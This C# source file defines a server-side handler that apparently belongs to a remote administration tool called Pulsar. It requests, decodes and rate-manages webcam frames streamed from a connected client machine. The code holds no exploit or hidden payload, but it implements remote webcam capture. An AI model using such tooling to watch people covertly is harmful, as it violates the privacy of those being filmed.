using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Messages.Webcam;
using Pulsar.Common.Networking;
using Pulsar.Common.Video.Codecs;
using Pulsar.Server.Networking;
using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Threading.Tasks;

namespace Pulsar.Server.Messages
{
    public class RemoteWebcamHandler : MessageProcessorBase<Bitmap>, IDisposable
    {
        public bool IsStarted { get; private set; }
        public bool IsBufferedMode { get; set; } = true;

        private readonly object _codecLock = new object();
        private readonly object _sizeLock = new object();

        private Size _localResolution;

        public Size LocalResolution
        {
            get { lock (_sizeLock) return _localResolution; }
            set { lock (_sizeLock) _localResolution = value; }
        }

        public delegate void DisplaysChangedEventHandler(object sender, string[] value);
        public event DisplaysChangedEventHandler DisplaysChanged;

        private void OnDisplaysChanged(string[] webcams)
        {
            SynchronizationContext.Post(o =>
            {
                DisplaysChanged?.Invoke(this, (string[])o);
            }, webcams);
        }

        private readonly Client _client;
        private UnsafeStreamCodec _codec;

        private readonly int _initialFramesRequested = 5;
        private readonly int _defaultFrameRequestBatch = 3;

        private int _pendingFrames = 0;

        private readonly SemaphoreSlim _requestLock = new SemaphoreSlim(1, 1);

        private readonly Stopwatch _fpsTimer = new Stopwatch();
        private int _fpsCounter = 0;
        private double _estimatedFps = 0;
        private float _lastReportedFps = -1f;

        private readonly ConcurrentQueue<long> _timestamps = new ConcurrentQueue<long>();
        private readonly int _fpsWindow = 10;

        private long _accumFrameBytes = 0;
        private int _frameByteSamples = 0;

        private long _lastFrameBytes = 0;
        public long LastFrameSizeBytes => Interlocked.Read(ref _lastFrameBytes);

        public double AverageFrameSizeBytes
        {
            get
            {
                long total = Interlocked.Read(ref _accumFrameBytes);
                int count = Volatile.Read(ref _frameByteSamples);
                return count > 0 ? (double)total / count : 0.0;
            }
        }

        public float CurrentFps => _lastReportedFps > 0 ? _lastReportedFps : (float)_estimatedFps;

        public RemoteWebcamHandler(Client client) : base(true)
        {
            _client = client;
            _fpsTimer.Start();
        }

        public override bool CanExecute(IMessage message)
        {
            return message is GetWebcamResponse || message is GetAvailableWebcamsResponse;
        }

        public override bool CanExecuteFrom(ISender sender)
        {
            return _client.Equals(sender);
        }

        public override void Execute(ISender sender, IMessage msg)
        {
            if (msg is GetWebcamResponse)
                Execute(sender, (GetWebcamResponse)msg);
            else if (msg is GetAvailableWebcamsResponse)
                Execute(sender, (GetAvailableWebcamsResponse)msg);
        }

        private void ResetTimestamps()
        {
            while (_timestamps.TryDequeue(out _)) { }
        }

        public void BeginReceiveFrames(int quality, int display)
        {
            lock (_codecLock)
            {
                IsStarted = true;

                _codec?.Dispose();
                _codec = null;

                _pendingFrames = _initialFramesRequested;
                ResetTimestamps();
                _fpsCounter = 0;
                _fpsTimer.Restart();

                _client.Send(new GetWebcam
                {
                    CreateNew = true,
                    Quality = quality,
                    DisplayIndex = display,
                    Status = RemoteWebcamStatus.Start,
                    IsBufferedMode = IsBufferedMode,
                    FramesRequested = _initialFramesRequested
                });
            }
        }

        public void EndReceiveFrames()
        {
            lock (_codecLock)
            {
                IsStarted = false;
            }

            Debug.WriteLine("Remote webcam session stopped.");
            _client.Send(new GetWebcam { Status = RemoteWebcamStatus.Stop });
        }

        public void RefreshDisplays()
        {
            _client.Send(new GetAvailableWebcams());
        }

        private async void Execute(ISender sender, GetWebcamResponse msg)
        {
            _fpsCounter++;

            if (msg.FrameRate > 0)
                _lastReportedFps = msg.FrameRate;

            if (_fpsTimer.ElapsedMilliseconds >= 1000)
            {
                _estimatedFps = _fpsCounter / (_fpsTimer.ElapsedMilliseconds / 1000.0);
                _fpsCounter = 0;
                _fpsTimer.Restart();
            }

            lock (_codecLock)
            {
                if (!IsStarted)
                    return;

                bool codecMismatch =
                    _codec == null ||
                    _codec.ImageQuality != msg.Quality ||
                    _codec.Monitor != msg.Monitor ||
                    !_codec.Resolution.Equals(msg.Resolution);

                if (codecMismatch)
                {
                    _codec?.Dispose();
                    _codec = new UnsafeStreamCodec(msg.Quality, msg.Monitor, msg.Resolution);
                }

                if (msg.Image != null)
                {
                    long size = msg.Image.LongLength;
                    Interlocked.Exchange(ref _lastFrameBytes, size);
                    Interlocked.Add(ref _accumFrameBytes, size);
                    Interlocked.Increment(ref _frameByteSamples);
                }

                try
                {
                    using (var ms = new MemoryStream(msg.Image))
                    {
                        var frame = _codec.DecodeData(ms);

                        if (frame != null)
                        {
                            EnsureLocalResolution(frame.Size);
                            OnReport(frame);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine("Frame decode error: " + ex.Message);
                }

                msg.Image = null;

                _timestamps.Enqueue(msg.Timestamp);
                while (_timestamps.Count > _fpsWindow && _timestamps.TryDequeue(out _)) { }

                Interlocked.Decrement(ref _pendingFrames);
            }

            if (IsBufferedMode && (msg.IsLastRequestedFrame || _pendingFrames <= 1))
            {
                await RequestMoreFramesAsync();
            }
        }

        private void EnsureLocalResolution(Size fallback)
        {
            if (fallback.Width <= 0 || fallback.Height <= 0)
                return;

            Size current = LocalResolution;
            if (current.Width <= 0 || current.Height <= 0)
                LocalResolution = fallback;
        }

        private async Task RequestMoreFramesAsync()
        {
            if (!await _requestLock.WaitAsync(0))
                return;

            try
            {
                int batch = _defaultFrameRequestBatch;

                if (_estimatedFps > 25) batch = 5;
                if (_estimatedFps < 10) batch = 2;

                Interlocked.Add(ref _pendingFrames, batch);

                _client.Send(new GetWebcam
                {
                    CreateNew = false,
                    Quality = _codec != null ? _codec.ImageQuality : 75,
                    DisplayIndex = _codec != null ? _codec.Monitor : 0,
                    Status = RemoteWebcamStatus.Continue,
                    IsBufferedMode = true,
                    FramesRequested = batch
                });
            }
            finally
            {
                _requestLock.Release();
            }
        }

        private void Execute(ISender sender, GetAvailableWebcamsResponse msg)
        {
            OnDisplaysChanged(msg.Webcams);
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool d)
        {
            if (d)
            {
                lock (_codecLock)
                {
                    _codec?.Dispose();
                    _requestLock?.Dispose();
                    IsStarted = false;
                }
            }
        }
    }
}
